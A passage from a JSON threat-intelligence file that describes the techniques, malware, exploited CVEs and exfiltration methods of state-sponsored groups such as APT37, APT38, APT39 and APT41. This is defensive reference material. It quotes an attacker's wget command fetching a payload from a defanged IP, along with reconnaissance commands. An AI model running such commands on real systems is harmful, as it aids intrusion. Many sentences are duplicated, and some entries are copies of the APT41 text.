spearphishing emails., APT33 has used malicious e-mail attachments to lure victims into executing malware., APT33 has used valid accounts for initial access and privilege escalation., APT33 has used compromised Office 365 accounts in tandem with Ruler in an attempt to gain control of endpoints., APT33 utilize backdoors capable of capturing screenshots once installed on a system. , APT33 utilized PowerShell scripts to establish command and control and install files for execution.  , APT33 sent spear phishing emails containing links to HTML application files, which were embedded with malicious code.  APT33 has conducted targeted spear phishing campaigns against U.S. government agencies and private sector companies.",
    "APT37": "APT37 is a North Korean state-sponsored cyber espionage group that has been active since at least 2012. The group has targeted victims primarily in South Korea, but also in Japan, Vietnam, Russia, Nepal, China, India, Romania, Kuwait, and other parts of the Middle East. APT37 has also been linked to the following campaigns between 2016-2018: Operation Daybreak, Operation Erebus, Golden Time, Evil New Year, Are you Happy?, FreeMilk, North Korean Human Rights, and Evil New Year 2018., North Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name Lazarus Group instead of tracking clusters or subgroups., , , , , , , APT37 has a function in the initial dropper to bypass Windows UAC in order to execute the next payload with higher privileges., APT37 uses HTTPS to conceal C2 communications., APT37 has used an audio capturing utility known as SOUNDWAVE that captures microphone input., APT37's has added persistence via the Registry key HKCU/Software/Microsoft/CurrentVersion/Run/., APT37 has used Ruby scripts to execute payloads., APT37 has used the command-line interface., APT37 executes shellcode and a VBA script to decode Base64 strings., APT37 has used Python scripts to execute payloads., APT37 has used a credential stealer known as ZUMKONG that can harvest usernames and passwords stored in browsers., APT37 has collected data from victims' local systems., APT37 has access to destructive malware that is capable of overwriting a machine's Master Boot Record (MBR)., APT37 has used strategic web compromises, particularly of South Korean websites, to distribute malware. The group has also used torrent file-sharing sites to more indiscriminately disseminate malware to victims. As part of their compromises, the group has used a Javascript based profiler called RICECURRY to profile a victim's web browser and deliver malicious code accordingly., APT37 has used exploits for Flash Player (CVE-2016-4117, CVE-2018-4878), Word (CVE-2017-0199), Internet Explorer (CVE-2020-1380 and CVE-2020-26411), and Microsoft Edge (CVE-2021-26411) for execution., APT37 has downloaded second stage malware from compromised websites., APT37 has used Windows DDE for execution of commands and a malicious VBS., APT37 has signed its malware with an invalid digital certificates listed as 'Tencent Technology (Shenzhen) Company Limited.', APT37 leverages the Windows API calls: VirtualAlloc(), WriteProcessMemory(), and CreateRemoteThread() for process injection., APT37 obfuscates strings and payloads., APT37 uses steganography to send images to users that are embedded with shellcode., APT37 has a Bluetooth device harvester, which uses Windows Bluetooth APIs to find information on connected Bluetooth devices. , APT37 delivers malware using spearphishing emails with malicious HWP attachments., APT37's Freenki malware lists running processes using the Microsoft Windows API., APT37 injects its malware variant, ROKRAT, into the cmd.exe process., APT37 has created scheduled tasks to run malicious scripts on a compromised host., APT37 collects the computer name, the BIOS model, and execution path., APT37 identifies the victim username., APT37 has used malware that will issue the command shutdown /r /t 1 to reboot a system after wiping its MBR., APT37 has sent spearphishing attachments attempting to get a user to open them., APT37 leverages social networking sites and cloud platforms (AOL, Twitter, Yandex, Mediafire, pCloud, Dropbox, and Box) for C2.",
    "APT38": "APT38 is a North Korean state-sponsored threat group that specializes in financial cyber operations; it has been attributed to the Reconnaissance General Bureau. Active since at least 2014, APT38 has targeted banks, financial institutions, casinos, cryptocurrency exchanges, SWIFT system endpoints, and ATMs in at least 38 countries worldwide. Significant operations include the 2016 Bank of Bangladesh heist, during which APT38 stole $81 million, as well as attacks against Bancomext  and Banco de Chile ; some of their attacks have been destructive., North Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name Lazarus Group instead of tracking clusters or subgroups., , , , , , , APT38 used a backdoor, QUICKRIDE, to communicate to the C2 server over HTTP and HTTPS., APT38 has collected browser bookmark information to learn more about compromised hosts, obtain personal information about users, and acquire details about internal network resources., APT38 has used brute force techniques to attempt account access when passwords are unknown or when password hashes are unavailable., APT38 used a Trojan called KEYLIME to collect data from the clipboard., APT38 has used PowerShell to execute commands and other operational tasks., APT38 has used a command-line tunneler, NACHOCHEESE, to give them shell access to a victim’s machine., APT38 has used VBScript to execute commands and other operational tasks., APT38 has installed a new Windows service to establish persistence., APT38 has used a custom secure delete function to make deleted files unrecoverable., APT38 has used Hermes ransomware to encrypt files with AES256., APT38 has collected data from a compromised host., APT38 has used DYEPACK to create, delete, and alter records in databases used for SWIFT transactions., APT38 has used DYEPACK to manipulate SWIFT messages en route to a printer., APT38 has used DYEPACK.FOX to manipulate PDF data as it is accessed to remove traces of fraudulent SWIFT transactions from the data displayed to the end user., APT38 has used a custom MBR wiper named BOOTWRECK to render systems inoperable., APT38 has conducted watering holes schemes to gain initial access to victims., APT38 have enumerated files and directories, or searched in specific locations within a compromised host., APT38 has prepended a space to all of their terminal commands to operate without leaving traces in the HISTCONTROL environment., APT38 have created firewall exemptions on specific ports, including ports 443, 6443, 8443, and 9443., APT38 clears Window Event logs and Sysmon logs from the system., APT38 has used a utility called CLOSESHAVE that can securely delete a file from the system. They have also removed malware, tools, or other non-native files used during the intrusion to reduce their footprint or as part of the post-intrusion cleanup process., APT38 has modified data timestamps to mimic files that are in the same folder on a compromised host., APT38 used a backdoor, NESTEGG, that has the capability to download and upload files to and from a victim’s machine., APT38 used a Trojan called KEYLIME to capture keystrokes from the victim’s machine., APT38 uses a tool called CLEANTOAD that has the capability to modify Registry keys., APT38 has used the Windows API to execute code within a victim's system. , APT38 has enumerated network shares on a compromised host., APT38 has used several code packing methods such as Themida, Enigma, VMProtect, and Obsidium, to pack their implants., APT38 has obtained and used open-source tools such as Mimikatz., APT38 has conducted spearphishing campaigns using malicious email attachments., APT38 leveraged Sysmon to understand the processes, services in the organization., APT38 has used cron to create pre-scheduled and periodic background jobs on a Linux system., APT38 has used Task Scheduler to run programs at system startup or on a scheduled basis for persistence., APT38 has used web shells for persistence or to ensure redundant access., APT38 has identified security software, configurations, defensive tools, and sensors installed on a compromised system., APT38 has used CHM files to move concealed payloads., APT38 has used rundll32.exe to execute binaries, scripts, and Control Panel Item files and to execute code via proxy to avoid triggering security tools., APT38 has attempted to get detailed information about a compromised host, including the operating system, version, patches, hotfixes, and service packs., APT38 installed a port monitoring tool, MAPMAKER, to print the active TCP connections on the local system., APT38 has identified primary users, currently logged in users, sets of users that commonly use a system, or inactive users., APT38 has created new services or modified existing ones to run executables, commands, or scripts., APT38 has used a custom MBR wiper named BOOTWRECK, which will initiate a system reboot after wiping the victim's MBR., APT38  has attempted to lure victims into enabling malicious macros within email attachments.",
    "APT39": "APT39 is one of several names for cyber espionage activity conducted by the Iranian Ministry of Intelligence and Security (MOIS) through the front company Rana Intelligence Computing since at least 2014. APT39 has primarily targeted the travel, hospitality, academic, and telecommunications industries in Iran and across Asia, Africa, Europe, and North America to track individuals and entities considered to be a threat by the MOIS., , Activities associated with APT39 largely align with a group publicly referred to as Chafer., , APT39 has used HTTP in communications with C2., APT39 has used remote access tools that leverage DNS in communications with C2., APT39 has used WinRAR and 7-Zip to compress an archive stolen data., APT39 has used the BITS protocol to exfiltrate stolen data from a compromised host., APT39 has maintained persistence using the startup folder., APT39 has modified LNK shortcuts., APT39 has used Ncrack to reveal credentials., APT39 has used tools capable of stealing contents of the clipboard., APT39 has utilized custom scripts to perform internal reconnaissance., APT39 has used PowerShell to execute malicious code., APT39 has utilized malicious VBS scripts in malware., APT39 has used a command line utility and a network scanner written in python., APT39 has utilized AutoIt malware scripts embedded in Microsoft Office documents or malicious links., APT39 has created accounts on multiple compromised hosts to perform actions within the network., APT39 has used the Smartftp Password Decryptor tool to decrypt FTP passwords., APT39 has used various tools to steal files from the compromised host., APT39 has utilized tools to aggregate data prior to exfiltration., APT39 has used malware to decrypt encrypted CAB files., APT39 has used malware to set LoadAppInit_DLLs in the Registry key SOFTWARE/Microsoft/Windows NT/CurrentVersion/Windows in order to establish persistence., APT39 has exfiltrated stolen victim data through C2 communications., APT39 has used SQL injection for initial compromise., APT39 has used tools with the ability to search for files on a compromised host., APT39 has used malware to delete files after they are deployed on a compromised host., APT39 has downloaded tools to compromised hosts., APT39 has utilized tools to capture mouse movements., APT39 has used tools for capturing keystrokes., APT39 has used malware disguised as Mozilla Firefox and a tool named mfevtpse.exe to proxy C2 communications, closely mimicking a legitimate McAfee file mfevtps.exe., APT39 has used CrackMapExec and a custom port scanner known as BLUETORCH for network scanning., APT39 has used the post exploitation tool CrackMapExec to enumerate network shares., APT39 has packed tools with UPX, and has repacked a modified version of Mimikatz to thwart anti-virus detection., APT39 has used malware to drop encrypted CAB files., APT39 has modified and used customized versions of publicly-available tools like PLINK and Mimikatz., APT39 has used different versions of Mimikatz to obtain credentials., APT39 has used Mimikatz, Windows Credential Editor and ProcDump to dump credentials., APT39 leveraged spearphishing emails with malicious attachments to initially compromise victims., APT39 leveraged spearphishing emails with malicious links to initially compromise victims., APT39 used custom tools to create SOCK5 and custom protocol proxies between infected hosts., APT39 has used various tools to proxy C2 communications., APT39 has used various strains of malware to query the Registry., APT39 has been seen using RDP for lateral movement and persistence, in some cases employing the rdpwinst tool for mangement of multiple sessions., APT39 has used SMB for lateral movement., APT39 used secure shell (SSH) to move laterally among their targets., APT39 has used NBTscan and custom tools to discover remote systems., APT39 has created scheduled tasks for persistence., APT39 has used a screen capture utility to take screenshots on a compromised host., APT39 has installed ANTAK and ASPXSPY web shells., APT39 has used malware to turn off the RequireSigned feature which ensures only signed DLLs can be run on Windows., APT39 used Remexi to collect usernames from the system., APT39 has used post-exploitation tools including RemCom and the Non-sucking Service Manager (NSSM) to execute processes., APT39 has sent spearphishing emails in an attempt to lure users to click on a malicious link., APT39 has sent spearphishing emails in an attempt to lure users to click on a malicious attachment., APT39 has used stolen credentials to compromise Outlook Web Access (OWA)., APT39 has communicated with C2 through files uploaded to and downloaded from DropBox.",
    "APT41": "APT41 is a threat group that researchers have assessed as Chinese state-sponsored espionage group that also conducts financially-motivated operations. Active since at least 2012, APT41 has been observed targeting various industries, including but not limited to healthcare, telecom, technology, finance, education, retail and video game industries in 14 countries. Notable behaviors include using a wide range of malware and tools to complete mission objectives. APT41 overlaps at least partially with public reporting on groups including BARIUM and Winnti Group., , , , APT41 DUST was conducted by APT41 from 2023 to July 2024., , During C0017, APT41 used a ConfuserEx obfuscated BADPOTATO exploit to abuse named-pipe impersonation for local NT AUTHORITY/SYSTEM privilege escalation., APT41 used built-in net commands to enumerate local administrator groups., APT41 used built-in net commands to enumerate domain administrator users., APT41 has added user accounts to the User and Admin groups. , APT41 DUST used infrastructure hosted behind Cloudflare or utilized Cloudflare Workers for command and control., APT41 used the Acunetix SQL injection vulnerability scanner in target reconnaissance operations, as well as the JexBoss tool to identify vulnerabilities in Java applications., APT41 leverages various tools and frameworks to brute-force directories on web servers., APT41 used HTTP to download payloads for CVE-2019-19781 and CVE-2020-10189 exploits. APT41 DUST used HTTPS for command and control.During C0017, APT41 ran wget http://103.224.80[.]44:8080/kernel to download malicious payloads., APT41 DUST used HTTPS for command and control., During C0017, APT41 ran wget http://103.224.80[.]44:8080/kernel to download malicious payloads., APT41 used exploit payloads that initiate download via ftp., APT41 used DNS for C2 communications. , APT41 created a RAR archive of targeted files for exfiltration. Additionally, APT41 used the makecab.exe utility to both download tools, such as NATBypass, to the victim network and to archive a file for exfiltration.APT41 DUST used rar to compress data downloaded from internal Oracle databases prior to exfiltration., APT41 DUST used rar to compress data downloaded from internal Oracle databases prior to exfiltration., During C0017, APT41 hex-encoded PII data prior to exfiltration., APT41 DUST used tools such as SQLULDR2 and PINEGROVE to gather local system and database information., APT41 used BITSAdmin to download and install payloads., APT41 created and modified startup files for persistence. APT41 added a registry key in HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Svchost to establish persistence for Cobalt Strike., APT41 used a hidden shell script in /etc/rc.d/init.d to leverage the ADORE.XSECbackdoor and Adore-NG rootkit., APT41 performed password brute-force attacks on the local admin account., APT41 leveraged PowerShell to deploy malware families in victims’ environments., APT41 used cmd.exe /c to execute commands on remote machines.APT41 used a batch file to install persistence for the Cobalt Strike BEACON loader.During C0017, APT41 used cmd.exe to execute reconnaissance commands., During C0017, APT41 used cmd.exe to execute reconnaissance commands., APT41 used Linux shell commands for system survey and information gathering prior to exploitation of vulnerabilities such as CVE-2019-19871., During C0017, APT41 deployed JScript web shells on compromised systems., APT41 DUST used compromised Google Workspace accounts for command and control., APT41 has created user accounts. , APT41 modified legitimate Windows services to install malware backdoors. APT41 created the StorSyncSvc service to provide persistence for Cobalt Strike.APT41 DUST used Windows Services with names such as Windows Defend for persistence of DUSTPAN., APT41 DUST used Windows Services with names such as Windows Defend for persistence of DUSTPAN., APT41 has obtained information about accounts, lists of employees, and plaintext and hashed passwords from databases., APT41 used BrowserGhost, a tool designed to obtain credentials from browsers, to retrieve information from password stores., APT41 used a ransomware called Encryptor RaaS to encrypt files on the targeted systems and provide a ransom note to the user. APT41 also used Microsoft Bitlocker to encrypt workstations and Jetico’s BestCrypt to encrypt servers., APT41 cloned victim user Git repositories during intrusions., APT41 has uploaded files and data from a compromised host.During C0017, APT41 collected information related to compromised machines as well as Personal Identifiable Information (PII) from victim networks. , During C0017, APT41 collected information related to compromised machines as well as Personal Identifiable Information (PII) from victim networks. , During C0017, APT41 frequently configured the URL endpoints of their stealthy passive backdoor LOWKEY.PASSIVE to masquerade as normal web application traffic on an infected server., APT41 DUST involved exporting data from Oracle databases to local CSV files prior to exfiltration.During C0017, APT41 copied the local SAM and SYSTEM Registry hives to a staging directory., During C0017, APT41 copied the local SAM and SYSTEM Registry hives to a staging directory., APT41 transfers post-exploitation files dividing the payload into fixed-size chunks to evade detection., During C0017, APT41 used the DUSTPAN loader to decrypt embedded payloads., APT41 used scheduled tasks created via Group Policy Objects (GPOs) to deploy ransomware., APT41 has used DGAs to change their C2 servers monthly., APT41 DUST used HTTPS for command and control., APT41 leveraged sticky keys to establish persistence. , APT41 has encrypted payloads using the Data Protection API (DPAPI), which relies on keys tied to specific user accounts on specific machines. APT41 has also environmentally keyed second stage malware with an RC5 key derived in part from the infected system's volume serial number., During C0017, APT41 exfiltrated victim data via DNS lookups by encoding and prepending it as subdomains to the attacker-controlled domain., During C0017, APT41 used its Cloudflare services C2 channels for data exfiltration., APT41 DUST exfiltrated collected information to OneDrive., APT41 exploited CVE-2020-10189 against Zoho ManageEngine Desktop Central through unsafe deserialization, and CVE-2019-19781 to compromise Citrix Application Delivery Controllers (ADC) and gateway devices. APT41 leveraged vulnerabilities such as ProxyLogon exploitation or SQL injection for initial access. APT41 exploited CVE-2021-26855 against a vulnerable Microsoft Exchange Server to gain initial access to the victim network.During C0017, APT41 exploited CVE-2021-44207 in the USAHerds application and CVE-2021-44228 in Log4j, as well as other .NET deserialization, SQL injection, and directory traversal vulnerabilities to gain initial access., During C0017, APT41 exploited CVE-2021-44207 in the USAHerds application and CVE-2021-44228 in Log4j, as well as other .NET deserialization, SQL injection, and directory traversal vulnerabilities to gain initial access., APT41 leveraged the follow exploits in their operations: CVE-2012-0158, CVE-2015-1641, CVE-2017-0199, CVE-2017-11882, and CVE-2019-3396. , APT41 compromised an online billing/payment service using VPN access between a third-party service provider and the targeted payment service., APT41 used the Steam community page as a fallback mechanism for C2. , APT41 has executed file /bin/pwd on exploited victims, perhaps to return architecture related information., APT41 has used search order hijacking to execute malicious payloads, such as Winnti for Windows.APT41 DUST involved the use of DLL search order hijacking to execute DUSTTRAP., APT41 DUST involved the use of DLL search order hijacking to execute DUSTTRAP., APT41 used legitimate executables to perform DLL side-loading of their malware. APT41 DUST used DLL side-loading to execute DUSTTRAP via an AhnLab uninstaller., APT41 DUST used DLL side-loading to execute DUSTTRAP via an AhnLab uninstaller., APT41 has configured payloads to load via LD_PRELOAD. , APT41 developed a custom injector that enables an Event Tracing for Windows (ETW) bypass, making malicious processes invisible to Windows logging., APT41 impersonated an employee at a video game developer company to send phishing emails., APT41 attempted to remove evidence of some of its activity by clearing Windows security and system events., APT41 attempted to remove evidence of some of its activity by deleting Bash histories., APT41 deleted files from the system.APT41 DUST deleted various artifacts from victim systems following use., APT41 DUST deleted various artifacts from victim systems following use., APT41 used certutil to download additional files. APT41 downloaded post-exploitation tools such as Cobalt Strike via command shell following initial access. APT41 has uploaded Procdump   and NATBypass to a staging directory and has used these tools in follow-on activities.APT41 DUST involved execution of certutil.exe via web shell to download the DUSTPAN dropper.During C0017, APT41 downloaded malicious payloads onto compromised systems., APT41 DUST involved execution of certutil.exe via web shell to download the DUSTPAN dropper., During C0017, APT41 downloaded malicious payloads onto compromised systems., APT41 used a keylogger called GEARSHIFT on a target system., APT41 uses remote shares to move and remotely execute payloads during lateral movemement., APT41 has created services to appear as benign system tools.APT41 DUST disguised DUSTPAN as a legitimate Windows binary such as w3wp.exe or conn.exe.During C0017, APT41 used SCHTASKS  /Change to modify legitimate scheduled tasks to run malicious code., APT41 DUST disguised DUSTPAN as a legitimate Windows binary such as w3wp.exe or conn.exe., During C0017, APT41 used SCHTASKS  /Change to modify legitimate scheduled tasks to run malicious code., APT41 attempted to masquerade their files as popular anti-virus software.During C0017, APT41 used file names beginning with USERS, SYSUSER, and SYSLOG for DEADEYE, and changed KEYPLUG file extensions from .vmp  to .upx likely to avoid hunting detections., During C0017, APT41 used file names beginning with USERS, SYSUSER, and SYSLOG for DEADEYE, and changed KEYPLUG file extensions from .vmp  to .upx likely to avoid hunting detections., APT41 used a malware variant called GOODLUCK to modify the registry in order to steal credentials., APT41 used the storescyncsvc.dll BEACON backdoor to download a secondary backdoor., APT41 used NATBypass to bypass firewall restrictions and to access compromised systems via RDP., APT41 used a malware variant called WIDETONE to conduct port scans on specified subnets., APT41 used the net share command as part of network reconnaissance., APT41 used VMProtected binaries in multiple intrusions.During C0017, APT41 broke malicious binaries, including DEADEYE and KEYPLUG, into multiple sections on disk to evade detection., During C0017, APT41 broke malicious binaries, including DEADEYE and KEYPLUG, into multiple sections on disk to evade detection., APT41 uses packers such as Themida to obfuscate malicious files.During C0017, APT41 used VMProtect to slow the reverse engineering of malicious binaries., During C0017, APT41 used VMProtect to slow the reverse engineering of malicious binaries., APT41 DUST used encrypted payloads decrypted and executed in memory., APT41 has obtained and used tools such as Mimikatz, pwdump, PowerSploit, and Windows Credential Editor.For C0017, APT41 obtained publicly available tools such as YSoSerial.NET, ConfuserEx, and BadPotato., For C0017, APT41 obtained publicly available tools such as YSoSerial.NET, ConfuserEx, and BadPotato., APT41 DUST used stolen code signing certificates to sign DUSTTRAP malware and components., APT41 has used hashdump, Mimikatz, Procdump, and the Windows Credential Editor to dump password hashes from memory and authenticate to other user accounts., APT41 extracted user account data from the Security Account Managerr (SAM), making a copy of this database from the registry using the reg save command or by exploiting volume shadow copies.During C0017, APT41 copied the SAM and SYSTEM Registry hives for credential harvesting., During C0017, APT41 copied the SAM and SYSTEM Registry hives for credential harvesting., APT41 used ntdsutil to obtain a copy of the victim environment ntds.dit file., APT41 used net group commands to enumerate various Windows user groups and permissions., APT41 sent spearphishing emails with attachments such as compiled HTML (.chm) files to initially compromise their victims., APT41 deployed Master Boot Record bootkits on Windows systems to hide their malware and maintain persistence on victim systems., APT41 malware TIDYELF loaded the main WINTERLOVE component by injecting it into the iexplore.exe process., APT41 used a tool called CLASSFON to covertly proxy network communications.During C0017, APT41 used the Cloudflare CDN to proxy C2 traffic., During C0017, APT41 used the Cloudflare CDN to proxy C2 traffic., APT41 queried registry values to determine items such as configured RDP ports and network configurations., APT41 used RDP for lateral movement. APT41 used NATBypass to expose local RDP ports on compromised systems to the Internet. , APT41 has transferred implant files using Windows Admin Shares and the Server Message Block (SMB) protocol, then executes files through Windows Management Instrumentation (WMI)., APT41 has used MiPing to discover active systems in the victim network. , APT41 deployed a Monero cryptocurrency mining tool in a victim’s environment., APT41 deployed rootkits on Linux systems., APT41 used a compromised account to create a scheduled task on a system.During C0017, APT41 used the following Windows scheduled tasks for DEADEYE dropper persistence on US state government networks: /Microsoft/Windows/PLA/Server Manager Performance Monitor, /Microsoft/Windows/Ras/ManagerMobility, /Microsoft/Windows/WDI/SrvSetupResults, and /Microsoft/Windows/WDI/USOShared. , During C0017, APT41 used the following Windows scheduled tasks for DEADEYE dropper persistence on US state government networks: /Microsoft/Windows/PLA/Server Manager Performance Monitor, /Microsoft/Windows/Ras/ManagerMobility, /Microsoft/Windows/WDI/SrvSetupResults, and /Microsoft/Windows/WDI/USOShared. , APT41 uses the Chinese website fofa.su, similar to the Shodan scanning service, for passive scanning of victims.APT41 DUST used internet scan data for target development., APT41 DUST used internet scan data for target development., APT41 DUST involved use of search engines to research victim servers., APT41 DUST involved access of external victim websites for target development., APT41 DUST involved use of web shells such as ANTSWORD and BLUEBEAM for persistence.During C0017, APT41 deployed JScript web shells through the creation of malicious ViewState objects., During C0017, APT41 deployed JScript web shells through the creation of malicious ViewState objects., APT41 leveraged code-signing certificates to sign malware when targeting both gaming and non-gaming organizations.APT41 DUST used stolen code signing certificates for DUSTTRAP malware and subsequent payloads., APT41 DUST used stolen code signing certificates for DUSTTRAP malware and subsequent payloads., APT41 gained access to production environments where they could inject malicious code into legitimate, signed files and widely distribute them to end users., APT41 used compiled HTML (.chm) files for targeting. , APT41 has used rundll32.exe to execute a loader., APT41 uses multiple built-in commands such as systeminfo and net config Workstation to enumerate victim system basic configuration information.During C0017, APT41 issued ping -n 1 ((cmd /c dir c:/|findstr Number).split()[-1]+ commands to find the volume serial number of compromised systems., During C0017, APT41 issued ping -n 1 ((cmd /c dir c:/|findstr Number).split()[-1]+ commands to find the volume serial number of compromised systems., APT41 collected MAC addresses from victim machines. During C0017, APT41 used cmd.exe /c ping %userdomain% for discovery., During C0017, APT41 used cmd.exe /c ping %userdomain% for discovery., APT41 has enumerated IP addresses of network resources and used the netstat command as part of network reconnaissance. The group has also used a malware variant, HIGHNOON, to enumerate active RDP sessions., APT41 has executed whoami commands, including using the WMIEXEC utility to execute this on remote machines.During C0017, APT41 used whoami to gather information from victim machines., During C0017, APT41 used whoami to gather information from victim machines., APT41 used  svchost.exe and Net to execute a system service installed to launch a Cobalt Strike BEACON loader.APT41 DUST used Windows services to execute DUSTPAN., APT41 DUST used Windows services to execute DUSTPAN., APT41 uses tools such as Mimikatz to enable lateral movement via captured password hashes., APT41 used compromised credentials to log on to other systems., APT41 used legitimate websites for C2 through dead drop resolvers (DDR), including GitHub, Pastebin, and Microsoft TechNet.During C0017, APT41 used dead drop resolvers on two separate tech community forums for their KEYPLUG Windows-version backdoor; notably APT41 updated the community forum posts frequently with new dead drop resolvers during the campaign., During C0017, APT41 used dead drop resolvers on two separate tech community forums for their KEYPLUG Windows-version backdoor; notably APT41 updated the community forum posts frequently with new dead drop resolvers during the campaign., APT41 used WMI in several ways, including for execution of commands via WMIEXEC as well as for persistence via PowerSploit. APT41 has executed files through Windows Management Instrumentation (WMI).",
    "Wicked Panda": "Active since at least 2012, APT41 has been observed targeting various industries, including but not limited to healthcare, telecom, technology, finance, education, retail and video game industries in 14 countries. Notable behaviors include using a wide range of malware and tools to complete mission objectives. APT41 overlaps at least partially with public reporting on groups including BARIUM and Winnti Group., , , , APT41 DUST was conducted by APT41 from 2023 to July 2024., , During C0017, APT41 used a ConfuserEx obfuscated BADPOTATO exploit to abuse named-pipe impersonation for local NT AUTHORITY/SYSTEM privilege escalation., APT41 used built-in net commands to enumerate local administrator groups., APT41 used built-in net commands to enumerate domain administrator users., APT41 has added user accounts to the User and Admin groups. , APT41 DUST used infrastructure hosted behind Cloudflare or utilized Cloudflare Workers for command and control., APT41 used the Acunetix SQL injection vulnerability scanner in target reconnaissance operations, as well as the JexBoss tool to identify vulnerabilities in Java applications., APT41 leverages various tools and frameworks to brute-force directories on web servers., APT41 used HTTP to download payloads for CVE-2019-19781 and CVE-2020-10189 exploits. APT41 DUST used HTTPS for command and control.During C0017, APT41 ran wget http://103.224.80[.]44:8080/kernel to download malicious payloads., APT41 DUST used HTTPS for command and control., During C0017, APT41 ran wget http://103.224.80[.]44:8080/kernel to download malicious payloads., APT41 used exploit payloads that initiate download via ftp., APT41 used DNS for C2 communications. , APT41 created a RAR archive of targeted files for exfiltration. Additionally, APT41 used the makecab.exe utility to both download tools, such as NATBypass, to the victim network and to archive a file for exfiltration.APT41 DUST used rar to compress data downloaded from internal Oracle databases prior to exfiltration., APT41 DUST used rar to compress data downloaded from internal Oracle databases prior to exfiltration., During C0017, APT41 hex-encoded PII data prior to exfiltration., APT41 DUST used tools such as SQLULDR2 and PINEGROVE to gather local system and database information., APT41 used BITSAdmin to download and install payloads., APT41 created and modified startup files for persistence. APT41 added a registry key in HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Svchost to establish persistence for Cobalt Strike., APT41 used a hidden shell script in /etc/rc.d/init.d to leverage the ADORE.XSECbackdoor and Adore-NG rootkit., APT41 performed password brute-force attacks on the local admin account., APT41 leveraged PowerShell to deploy malware families in victims’ environments., APT41 used cmd.exe /c to execute commands on remote machines.APT41 used a batch file to install persistence for the Cobalt Strike BEACON loader.During C0017, APT41 used cmd.exe to execute reconnaissance commands., During C0017, APT41 used cmd.exe to execute reconnaissance commands., APT41 used Linux shell commands for system survey and information gathering prior to exploitation of vulnerabilities such as CVE-2019-19871., During C0017, APT41 deployed JScript web shells on compromised systems., APT41 DUST used compromised Google Workspace accounts for command and control., APT41 has created user accounts. , APT41 modified legitimate Windows services to install malware backdoors. APT41 created the StorSyncSvc service to provide persistence for Cobalt Strike.APT41 DUST used Windows Services with names such as Windows Defend for persistence of DUSTPAN., APT41 DUST used Windows Services with names such as Windows Defend for persistence of DUSTPAN., APT41 has obtained information about accounts, lists of employees, and plaintext and hashed passwords from databases., APT41 used BrowserGhost, a tool designed to obtain credentials from browsers, to retrieve information from password stores., APT41 used a ransomware called Encryptor RaaS to encrypt files on the targeted systems and provide a ransom note to the user. APT41 also used Microsoft Bitlocker to encrypt workstations and Jetico’s BestCrypt to encrypt servers., APT41 cloned victim user Git repositories during intrusions., APT41 has uploaded files and data from a compromised host.",
    "Brass Typhoon": " APT41 used a ransomware called Encryptor RaaS to encrypt files on the targeted systems and provide a ransom note to the user. APT41 also used Microsoft Bitlocker to encrypt workstations and Jetico’s BestCrypt to encrypt servers., APT41 cloned victim user Git repositories during intrusions., APT41 has uploaded files and data from a compromised host.During C0017, APT41 collected information related to compromised machines as well as Personal Identifiable Information (PII) from victim networks. , During C0017, APT41 collected information related to compromised machines as well as Personal Identifiable Information (PII) from victim networks. , During C0017, APT41 frequently configured the URL endpoints of their stealthy passive backdoor LOWKEY.PASSIVE to masquerade as normal web application traffic on an infected server., APT41 DUST involved exporting data from Oracle databases to local CSV files prior to exfiltration.During C0017, APT41 copied the local SAM and SYSTEM Registry hives to a staging directory., During C0017, APT41 copied the local SAM and SYSTEM Registry hives to a staging directory., APT41 transfers post-exploitation files dividing the payload into fixed-size chunks to evade detection., During C0017, APT41 used the DUSTPAN loader to decrypt embedded payloads., APT41 used scheduled tasks created via Group Policy Objects (GPOs) to deploy ransomware., APT41 has used DGAs to change their C2 servers monthly., APT41 DUST used HTTPS for command and control., APT41 leveraged sticky keys to establish persistence. , APT41 has encrypted payloads using the Data Protection API (DPAPI), which relies on keys tied to specific user accounts on specific machines. APT41 has also environmentally keyed second stage malware with an RC5 key derived in part from the infected system's volume serial number., During C0017, APT41 exfiltrated victim data via DNS lookups by encoding and prepending it as subdomains to the attacker-controlled domain., During C0017, APT41 used its Cloudflare services C2 channels for data exfiltration., APT41 DUST exfiltrated collected information to OneDrive., APT41 exploited CVE-2020-10189 against Zoho ManageEngine Desktop Central through unsafe deserialization, and CVE-2019-19781 to compromise Citrix Application Delivery Controllers (ADC) and gateway devices. APT41 leveraged vulnerabilities such as ProxyLogon exploitation or SQL injection for initial access. APT41 exploited CVE-2021-26855 against a vulnerable Microsoft Exchange Server to gain initial access to the victim network.During C0017, APT41 exploited CVE-2021-44207 in the USAHerds application and CVE-2021-44228 in Log4j, as well as other .NET deserialization, SQL injection, and directory traversal vulnerabilities to gain initial access., During C0017, APT41 exploited CVE-2021-44207 in the USAHerds application and CVE-2021-44228 in Log4j, as well as other .NET deserialization, SQL injection, and directory traversal vulnerabilities to gain initial access., APT41 leveraged the follow exploits in their operations: CVE-2012-0158, CVE-2015-1641, CVE-2017-0199, CVE-2017-11882, and CVE-2019-3396. , APT41 compromised an online billing/payment service using VPN access between a third-party service provider and the targeted payment service., APT41 used the Steam community page as a fallback mechanism for C2. , APT41 has executed file /bin/pwd on exploited victims, perhaps to return architecture related information., APT41 has used search order hijacking to execute malicious payloads, such as Winnti for Windows.APT41 DUST involved the use of DLL search order hijacking to execute DUSTTRAP., APT41 DUST involved the use of DLL search order hijacking to execute DUSTTRAP., APT41 used legitimate executables to perform DLL side-loading of their malware. APT41 DUST used DLL side-loading to execute DUSTTRAP via an AhnLab uninstaller., APT41 DUST used DLL side-loading to execute DUSTTRAP via an AhnLab uninstaller., APT41 has configured payloads to load via LD_PRELOAD. , APT41 developed a custom injector that enables an Event Tracing for Windows (ETW) bypass, making malicious processes invisible to Windows logging., APT41 impersonated an employee at a video game developer company to send phishing emails., APT41 attempted to remove evidence of some of its activity by clearing Windows security and system events., APT41 attempted to remove evidence of some of its activity by deleting Bash histories., APT41 deleted files from the system.APT41 DUST deleted various artifacts from victim systems following use., APT41 DUST deleted various artifacts from victim systems following use., APT41 used certutil to download additional files. APT41 downloaded post-exploitation tools such as Cobalt Strike via command shell following initial access. APT41 has uploaded Procdump   and NATBypass to a staging directory and has used these tools in follow-on activities.APT41 DUST involved execution of certutil.exe via web shell to download the DUSTPAN dropper.During C0017, APT41 downloaded malicious payloads onto compromised systems., APT41 DUST involved execution of certutil.exe via web shell to download the DUSTPAN dropper., During C0017, APT41 downloaded malicious payloads onto compromised systems., APT41 used a keylogger called GEARSHIFT on a target system.",
